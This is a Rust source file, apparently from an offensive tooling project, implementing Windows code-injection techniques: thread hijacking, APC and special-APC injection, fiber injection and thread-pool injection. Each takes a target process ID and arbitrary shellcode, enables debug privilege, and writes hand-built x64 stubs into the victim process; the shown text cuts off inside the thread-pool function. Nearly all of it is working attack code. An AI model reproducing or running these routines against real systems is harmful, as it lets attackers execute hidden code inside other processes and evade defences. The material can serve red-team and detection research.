//! Advanced thread manipulation injection techniques
//! Thread hijacking, APC injection, fiber injection, thread pool injection, stack bombing

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;

/// Thread Hijacking — suspend existing thread, modify RIP to point at shellcode, resume
/// No new thread created — hijacks an existing one
pub fn thread_hijack(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{
        GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT_FLAGS,
    };
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenThread, ResumeThread, SuspendThread, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT,
        THREAD_SUSPEND_RESUME,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let tid = args
        .get("tid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing tid (thread ID)".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;
    let restore = args
        .get("restore")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Thread Hijack: PID {} TID {} ({} bytes, restore={})",
        pid,
        tid,
        shellcode_bytes.len(),
        restore
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        // Open process for memory operations
        let hprocess = OpenProcess(
            PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let hprocess = SafeHandle::new(hprocess);

        // Open target thread
        let hthread = OpenThread(
            THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
            false,
            tid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenThread: {}", e)))?;
        let hthread = SafeHandle::new(hthread);

        // Suspend the thread
        let suspend_count = SuspendThread(*hthread);
        if suspend_count == u32::MAX {
            return Err(MemoricError::InjectionFailed(
                "SuspendThread failed".to_string(),
            ));
        }

        // Get thread context
        let mut context: windows::Win32::System::Diagnostics::Debug::CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FLAGS(0x10001F); // CONTEXT_FULL

        GetThreadContext(*hthread, &mut context).map_err(|e| {
            let _ = ResumeThread(*hthread);
            MemoricError::WindowsApi(format!("GetThreadContext: {}", e))
        })?;

        let original_rip = context.Rip;

        // Allocate memory in target process for shellcode (W^X: start with RW)
        let alloc_size = shellcode_bytes.len() + 64;
        let remote_mem = VirtualAllocEx(
            *hprocess,
            None,
            alloc_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_mem.is_null() {
            let _ = ResumeThread(*hthread);
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx failed".to_string(),
            ));
        }

        if restore {
            // Build shellcode + trampoline that jumps back to original RIP
            let mut payload = Vec::with_capacity(shellcode_bytes.len() + 64);

            // Push all volatile registers
            payload.extend_from_slice(&[0x50]); // push rax
            payload.extend_from_slice(&[0x51]); // push rcx
            payload.extend_from_slice(&[0x52]); // push rdx
            payload.extend_from_slice(&[0x53]); // push rbx
            payload.extend_from_slice(&[0x41, 0x50]); // push r8
            payload.extend_from_slice(&[0x41, 0x51]); // push r9
            payload.extend_from_slice(&[0x41, 0x52]); // push r10
            payload.extend_from_slice(&[0x41, 0x53]); // push r11
            payload.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28

            // Inline the shellcode
            payload.extend_from_slice(&shellcode_bytes);

            // Restore
            payload.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
            payload.extend_from_slice(&[0x41, 0x5B]); // pop r11
            payload.extend_from_slice(&[0x41, 0x5A]); // pop r10
            payload.extend_from_slice(&[0x41, 0x59]); // pop r9
            payload.extend_from_slice(&[0x41, 0x58]); // pop r8
            payload.extend_from_slice(&[0x5B]); // pop rbx
            payload.extend_from_slice(&[0x5A]); // pop rdx
            payload.extend_from_slice(&[0x59]); // pop rcx
            payload.extend_from_slice(&[0x58]); // pop rax

            // mov rax, original_rip; jmp rax
            payload.extend_from_slice(&[0x48, 0xB8]);
            payload.extend_from_slice(&original_rip.to_le_bytes());
            payload.extend_from_slice(&[0xFF, 0xE0]);

            WriteProcessMemory(
                *hprocess,
                remote_mem,
                payload.as_ptr() as *const _,
                payload.len(),
                None,
            )
            .map_err(|e| {
                let _ = ResumeThread(*hthread);
                MemoricError::InjectionFailed(format!("WriteProcessMemory: {}", e))
            })?;
        } else {
            // Direct shellcode, no restore
            WriteProcessMemory(
                *hprocess,
                remote_mem,
                shellcode_bytes.as_ptr() as *const _,
                shellcode_bytes.len(),
                None,
            )
            .map_err(|e| {
                let _ = ResumeThread(*hthread);
                MemoricError::InjectionFailed(format!("WriteProcessMemory: {}", e))
            })?;
        }

        // W^X: mark as RX after writing
        let mut old_prot = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *hprocess,
            remote_mem,
            alloc_size,
            PAGE_EXECUTE_READ,
            &mut old_prot,
        )
        .map_err(|e| {
            let _ = ResumeThread(*hthread);
            MemoricError::InjectionFailed(format!("VirtualProtectEx RX: {}", e))
        })?;

        // Set RIP to our shellcode
        context.Rip = remote_mem as u64;
        SetThreadContext(*hthread, &context).map_err(|e| {
            let _ = ResumeThread(*hthread);
            MemoricError::WindowsApi(format!("SetThreadContext: {}", e))
        })?;

        // Resume the thread
        let _ = ResumeThread(*hthread);

        Ok(serde_json::json!({
            "success": true,
            "technique": "thread_hijack",
            "pid": pid,
            "tid": tid,
            "original_rip": format!("0x{:016X}", original_rip),
            "shellcode_address": format!("0x{:016X}", remote_mem as u64),
            "shellcode_size": shellcode_bytes.len(),
            "restore_execution": restore,
            "message": format!("Thread {} hijacked — RIP redirected to shellcode at 0x{:016X}", tid, remote_mem as u64)
        }))
    }
}

/// APC Injection — queue user APC to all alertable threads in target process
/// More aggressive than Early Bird: targets all threads in an existing process
pub fn apc_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenThread, QueueUserAPC, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;
    let target_tid = args.get("tid").and_then(|v| v.as_u64()); // optional: target specific thread

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] APC Injection: PID {} ({} bytes)",
        pid,
        shellcode_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        // Open process
        let hprocess = OpenProcess(
            PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let hprocess = SafeHandle::new(hprocess);

        // Allocate and write shellcode (W^X: RW then RX)
        let remote_mem = VirtualAllocEx(
            *hprocess,
            None,
            shellcode_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx failed".to_string(),
            ));
        }

        WriteProcessMemory(
            *hprocess,
            remote_mem,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory: {}", e)))?;

        let mut old_prot = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *hprocess,
            remote_mem,
            shellcode_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old_prot,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx RX: {}", e)))?;

        // Enumerate threads and queue APC
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("CreateToolhelp32Snapshot: {}", e)))?;
        let snap = SafeHandle::new(snap);

        let mut entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };

        let mut queued_count = 0u32;
        let mut failed_count = 0u32;

        if Thread32First(*snap, &mut entry).is_ok() {
            loop {
                if entry.th32OwnerProcessID == pid as u32 {
                    if let Some(target) = target_tid {
                        if entry.th32ThreadID != target as u32 {
                            if !Thread32Next(*snap, &mut entry).is_ok() {
                                break;
                            }
                            continue;
                        }
                    }

                    if let Ok(hthread) = OpenThread(THREAD_SET_CONTEXT, false, entry.th32ThreadID) {
                        let hthread = SafeHandle::new(hthread);
                        let result =
                            QueueUserAPC(Some(std::mem::transmute(remote_mem)), *hthread, 0);
                        if result != 0 {
                            queued_count += 1;
                        } else {
                            failed_count += 1;
                        }
                    } else {
                        failed_count += 1;
                    }
                }
                if !Thread32Next(*snap, &mut entry).is_ok() {
                    break;
                }
            }
        }

        Ok(serde_json::json!({
            "success": queued_count > 0,
            "technique": "apc_injection",
            "pid": pid,
            "shellcode_address": format!("0x{:016X}", remote_mem as u64),
            "threads_queued": queued_count,
            "threads_failed": failed_count,
            "message": format!("APC queued to {} threads. Shellcode executes when thread enters alertable state.", queued_count)
        }))
    }
}

/// NtQueueApcThreadEx — Special User APC injection (Win10+)
/// Does NOT require alertable thread state — guaranteed execution
pub fn special_apc_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenThread, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
        THREAD_SET_CONTEXT,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;
    let target_tid = args.get("tid").and_then(|v| v.as_u64());

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Special APC (NtQueueApcThreadEx): PID {} ({} bytes)",
        pid,
        shellcode_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        // Resolve NtQueueApcThreadEx
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;
        let nt_queue_apc_ex = GetProcAddress(
            ntdll,
            windows::core::PCSTR(b"NtQueueApcThreadEx\0".as_ptr()),
        )
        .ok_or_else(|| {
            MemoricError::WindowsApi("NtQueueApcThreadEx not found (Win10+ required)".to_string())
        })?;

        type NtQueueApcThreadExFn = unsafe extern "system" fn(
            isize,
            usize,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
        ) -> i32;
        let nt_queue_apc_ex: NtQueueApcThreadExFn = std::mem::transmute(nt_queue_apc_ex);

        let hprocess = OpenProcess(
            PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let hprocess = SafeHandle::new(hprocess);

        // W^X: allocate RW, write, then protect RX
        let remote_mem = VirtualAllocEx(
            *hprocess,
            None,
            shellcode_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_mem.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx failed".to_string(),
            ));
        }

        WriteProcessMemory(
            *hprocess,
            remote_mem,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory: {}", e)))?;

        let mut old_prot = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *hprocess,
            remote_mem,
            shellcode_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old_prot,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx RX: {}", e)))?;

        // Find first thread in target process
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("CreateToolhelp32Snapshot: {}", e)))?;
        let snap = SafeHandle::new(snap);

        let mut entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };

        let mut queued_count = 0u32;

        if Thread32First(*snap, &mut entry).is_ok() {
            loop {
                if entry.th32OwnerProcessID == pid as u32 {
                    if let Some(target) = target_tid {
                        if entry.th32ThreadID != target as u32 {
                            if !Thread32Next(*snap, &mut entry).is_ok() {
                                break;
                            }
                            continue;
                        }
                    }

                    if let Ok(hthread) = OpenThread(THREAD_SET_CONTEXT, false, entry.th32ThreadID) {
                        let hthread = SafeHandle::new(hthread);

                        // Queue Special User APC (UserApcReserveHandle = 1 = QUEUE_USER_APC_SPECIAL_USER_APC)
                        let status = nt_queue_apc_ex(
                            hthread.0 as isize,
                            1, // QUEUE_USER_APC_SPECIAL_USER_APC
                            remote_mem,
                            std::ptr::null(),
                            std::ptr::null(),
                            std::ptr::null(),
                        );

                        if status >= 0 {
                            queued_count += 1;
                            if target_tid.is_some() {
                                break;
                            }
                        }
                    }
                }
                if !Thread32Next(*snap, &mut entry).is_ok() {
                    break;
                }
            }
        }

        Ok(serde_json::json!({
            "success": queued_count > 0,
            "technique": "special_apc_injection",
            "api": "NtQueueApcThreadEx",
            "pid": pid,
            "shellcode_address": format!("0x{:016X}", remote_mem as u64),
            "threads_queued": queued_count,
            "message": format!("Special User APC queued to {} threads. Does NOT require alertable state — guaranteed execution.", queued_count)
        }))
    }
}

/// Fiber Injection — convert thread to fiber, create fiber pointing at shellcode, switch to it
pub fn fiber_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Fiber Injection: PID {} ({} bytes)",
        pid,
        shellcode_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let kernel32 = GetModuleHandleA(windows::core::PCSTR(b"kernel32.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("kernel32: {}", e)))?;

        let convert_to_fiber = GetProcAddress(
            kernel32,
            windows::core::PCSTR(b"ConvertThreadToFiber\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("ConvertThreadToFiber not found".to_string()))?;
        let create_fiber =
            GetProcAddress(kernel32, windows::core::PCSTR(b"CreateFiber\0".as_ptr()))
                .ok_or_else(|| MemoricError::WindowsApi("CreateFiber not found".to_string()))?;
        let switch_to_fiber =
            GetProcAddress(kernel32, windows::core::PCSTR(b"SwitchToFiber\0".as_ptr()))
                .ok_or_else(|| MemoricError::WindowsApi("SwitchToFiber not found".to_string()))?;

        let hprocess = OpenProcess(
            PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_QUERY_INFORMATION
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let hprocess = SafeHandle::new(hprocess);

        // W^X: Write shellcode RW, then protect RX
        let sc_remote = VirtualAllocEx(
            *hprocess,
            None,
            shellcode_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if sc_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx shellcode failed".to_string(),
            ));
        }
        WriteProcessMemory(
            *hprocess,
            sc_remote,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory: {}", e)))?;
        let mut old_prot = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *hprocess,
            sc_remote,
            shellcode_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old_prot,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx sc RX: {}", e)))?;

        // Build fiber bootstrap stub:
        // 1. ConvertThreadToFiber(NULL) — convert the remote thread into a fiber
        // 2. CreateFiber(0, shellcode_addr, NULL) — create fiber with shellcode as start
        // 3. SwitchToFiber(new_fiber) — execute it
        let mut stub = Vec::with_capacity(128);

        // sub rsp, 0x28 (shadow space)
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);

        // xor rcx, rcx; mov rax, ConvertThreadToFiber; call rax
        stub.extend_from_slice(&[0x48, 0x31, 0xC9]); // xor rcx, rcx
        stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, imm64
        stub.extend_from_slice(&(convert_to_fiber as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
        stub.extend_from_slice(&[0x50]); // push rax (save main fiber)

        // xor rcx, rcx (stack size = 0)
        // mov rdx, shellcode_addr
        // xor r8, r8 (param = NULL)
        // mov rax, CreateFiber; call rax
        stub.extend_from_slice(&[0x48, 0x31, 0xC9]); // xor rcx, rcx
        stub.extend_from_slice(&[0x48, 0xBA]); // mov rdx, imm64
        stub.extend_from_slice(&(sc_remote as u64).to_le_bytes());
        stub.extend_from_slice(&[0x4D, 0x31, 0xC0]); // xor r8, r8
        stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, imm64
        stub.extend_from_slice(&(create_fiber as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]); // call rax

        // mov rcx, rax (new fiber handle)
        // mov rax, SwitchToFiber; call rax
        stub.extend_from_slice(&[0x48, 0x89, 0xC1]); // mov rcx, rax
        stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, imm64
        stub.extend_from_slice(&(switch_to_fiber as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]); // call rax

        // Clean up: SwitchToFiber back to main
        stub.extend_from_slice(&[0x59]); // pop rcx (main fiber)
        stub.extend_from_slice(&[0x48, 0xB8]); // mov rax, imm64
        stub.extend_from_slice(&(switch_to_fiber as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]); // call rax

        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        stub.extend_from_slice(&[0xC3]); // ret

        // W^X: Write stub RW, then protect RX
        let stub_remote = VirtualAllocEx(
            *hprocess,
            None,
            stub.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if stub_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx stub failed".to_string(),
            ));
        }
        WriteProcessMemory(
            *hprocess,
            stub_remote,
            stub.as_ptr() as *const _,
            stub.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory stub: {}", e)))?;
        VirtualProtectEx(
            *hprocess,
            stub_remote,
            stub.len(),
            PAGE_EXECUTE_READ,
            &mut old_prot,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx stub RX: {}", e)))?;

        let thread = CreateRemoteThread(
            *hprocess,
            None,
            0,
            Some(std::mem::transmute(stub_remote)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("CreateRemoteThread: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "fiber_injection",
            "pid": pid,
            "shellcode_address": format!("0x{:016X}", sc_remote as u64),
            "stub_address": format!("0x{:016X}", stub_remote as u64),
            "thread_handle": thread.0 as u64,
            "message": "Fiber injection complete — remote thread converts to fiber, creates shellcode fiber, switches to it"
        }))
    }
}

/// Thread Pool Injection — abuse Windows thread pool to execute shellcode
/// Creates TP_WORK item in remote process and submits it to the default thread pool
pub fn threadpool_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Thread Pool Injection: PID {} ({} bytes)",
        pid,
        shellcode_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let kernel32 = GetModuleHandleA(windows::core::PCSTR(b"kernel32.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("kernel32: {}", e)))?;
        let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;

        let create_tp_work = GetProcAddress(
            kernel32,
            windows::core::PCSTR(b"CreateThreadpoolWork\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("CreateThreadpoolWork not found".to_string()))?;
        let submit_tp_work = GetProcAddress(
            kernel32,
            windows::core::PCSTR(b"SubmitThreadpoolWork\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("SubmitThreadpoolWork not found".to_string()))?;
        let tp_alloc_work = GetProcAddress(ntdll, windows::core::PCSTR(b"TpAllocWork\0".as_ptr()))
            .ok_or_else(|| MemoricError::WindowsApi("TpAllocWork not found".to_string()))?;
        let tp_post_work = GetProcAddress(ntdll, windows::core::PCSTR(b"TpPostWork\0".as_ptr()))
            .ok_or_else(|| MemoricError::WindowsApi("TpPostWork not found".to_string()))?;

        let hprocess = OpenProcess(
            PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_READ
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let hprocess = SafeHandle::new(hprocess);

        // W^X: Write shellcode RW, then protect RX
        let sc_remote = VirtualAllocEx(
            *hprocess,
            None,
            shellcode_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if sc_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx shellcode failed".to_string(),
            ));
        }
        WriteProcessMemory(
            *hprocess,
            sc_remote,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory: {}", e)))?;
        let mut old_prot = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *hprocess,
            sc_remote,
            shellcode_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old_prot,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx sc RX: {}", e)))?;

        // Build stub that calls TpAllocWork + TpPostWork
        // TpAllocWork(OUT PTP_WORK *WorkReturn, PTP_WORK_CALLBACK Callback, PVOID Context, PTP_CALLBACK_ENVIRON Environment)
        // TpPostWork(PTP_WORK Work)
        let mut stub = Vec::with_capacity(128);

        // sub rsp, 0x38 (shadow + local)
        stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x38]);

        // lea rcx, [rsp+0x30] (WorkReturn pointer on stack)
        stub.extend_from_slice(&[0x48, 0x8D, 0x4C, 0x24, 0x30]);
        // mov rdx, sc_remote (callback = shellcode)
        stub.extend_from_slice(&[0x48, 0xBA]);
        stub.extend_from_slice(&(sc_remote as u64).to_le_bytes());
        // xor r8, r8 (context = NULL)
        stub.extend_from_slice(&[0x4D, 0x31, 0xC0]);
        // xor r9, r9 (environment = NULL)
        stub.extend_from_slice(&[0x4D, 0x31, 0xC9]);
        // mov rax, TpAllocWork; call rax
        stub.extend_from_slice(&[0x48, 0xB8]);
        stub.extend_from_slice(&(tp_alloc_work as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // mov rcx, [rsp+0x30] (load work item)
        stub.extend_from_slice(&[0x48, 0x8B, 0x4C, 0x24, 0x30]);
        // mov rax, TpPostWork; call rax
        stub.extend_from_slice(&[0x48, 0xB8]);
        stub.extend_from_slice(&(tp_post_work as u64).to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xD0]);

        // add rsp, 0x38; ret
        stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x38]);
        stub.extend_from_slice(&[0xC3]);

        // W^X: Write stub RW, then protect RX
        let stub_remote = VirtualAllocEx(
            *hprocess,
            None,
            stub.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if stub_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "VirtualAllocEx stub failed".to_string(),
            ));
        }
        WriteProcessMemory(
            *hprocess,
            stub_remote,
            stub.as_ptr() as *const _,
            stub.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory stub: {}", e)))?;
        VirtualProtectEx(
            *hprocess,
            stub_remote,
            stub.len(),
            PAGE_EXECUTE_READ,
            &mut old_prot,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx stub RX: {}", e)))?;

        let thread = CreateRemoteThread(
            *hprocess,
            None,
            0,
            Some(std::mem::transmute(stub_remote)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("CreateRemoteThread: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "threadpool_injection",
            "pid": pid,
            "api": ["TpAllocWork", "TpPostWork"],
            "shellcode_address": format!("0x{:016X}", sc_remote as u64),
            "stub_address": format!("0x{:016X}", stub_remote as u64),
